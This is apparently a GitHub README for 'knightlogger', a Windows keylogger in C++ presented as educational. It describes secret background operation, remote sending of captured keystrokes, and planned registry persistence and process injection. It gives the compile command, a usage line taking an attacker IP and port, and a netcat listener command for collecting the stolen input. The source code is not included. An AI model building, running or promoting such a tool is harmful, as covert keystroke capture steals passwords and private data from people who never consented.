# knightlogger
a basic stable keylogger written for eductional purpose works on windows platforms
# options:
- remote access keylogger
- works in background secretly
 -> additional functions will be added soon like registery persistence and inject in system proccesses
# compile
`g++ -o knightlogger.exe knightlogger.cpp -lwsock32`

**easy to use**
`knightlogger.exe ipaddr portnumber`

you can listen for connection by many ways for example netcat way
`nc -lvp 4444`

**notice:** support only english main alphabet ascii characters and some other special keys but not all ,  i will add full support soon 

